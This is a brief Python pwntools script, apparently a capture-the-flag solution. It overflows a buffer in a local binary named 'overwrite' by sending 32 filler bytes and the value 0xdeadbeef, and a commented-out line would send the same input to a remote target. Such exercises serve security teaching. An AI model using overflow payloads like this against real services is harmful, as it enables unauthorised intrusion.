from pwn import *

# local process environment
io = process('./overwrite')

#remote process environment
#io = remote('ip',port)

context.log_level = 'debug'

# send payload 
io.sendlineafter(b'?', b'a'*32 + p32(0xdeadbeef))

print(io.recvall().decode())